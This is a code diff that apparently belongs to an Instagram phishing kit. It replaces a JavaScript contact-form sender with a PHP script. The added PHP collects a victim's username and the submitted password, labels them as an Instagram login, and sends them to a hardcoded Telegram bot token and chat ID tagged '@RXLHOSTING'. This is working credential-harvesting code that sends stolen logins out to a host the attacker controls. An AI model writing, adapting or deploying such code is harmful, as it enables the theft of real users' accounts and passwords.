@@ -1,27 +1,27 @@
-    function kirimPesanTelegram(pesan) {
-        var botToken = '6013753018:AAEWqmIp8DmwejWRqbC0MpL1QaN-zJdopCE'; // Ganti dengan token bot Anda
-        var chatId = '2079666452'; // Ganti dengan ID obrolan Anda
-        var message = encodeURIComponent(pesan);
-        var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + message;
+<?php
+session_start();
+$uname = "<code>".$_SESSION['uname']."</code>";
+$pass = "<code>".$_POST['pass']."</code>";
 
-        fetch(url)
-            .then(response => response.json())
-            .then(data => {
-                // Handle response if needed
-                console.log(data);
-            })
-            .catch(error => {
-                // Handle error if needed
-                console.error('Error:', error);
-            });
-    }
+$message = "
+( Instagram | Login )
+==========================
+- Username : ".$uname."
+- Password : ".$pass." 
+==========================
+Tele : @RXLHOSTING
+ ";
+function sendMessage($id_telegram, $message, $id_botTele) {
+    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
+    $url = $url . "&text=" . urlencode($message);
+    $ch = curl_init();
+    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
 
-    // Menangani pengiriman form
-    document.querySelector('.contacts__form').addEventListener('submit', function(event) {
-        event.preventDefault(); // Menghentikan pengiriman form bawaan
-
-        var pesan = 'Pesan yang 66667777777 ingin Anda kirim'; // Sesuaikan pesan sesuai dengan data dari form
-        kirimPesanTelegram(pesan);
-
-        // Tambahkan logika lain yang Anda perlukan setelah pengiriman pesan
-    });
+$id_botTele = "6013753018:AAEWqmIp8DmwejWRqbC0MpL1QaN-zJdopCE";
+$id_telegram = "2079666452";
+sendMessage($id_telegram, $message, $id_botTele);
+?>
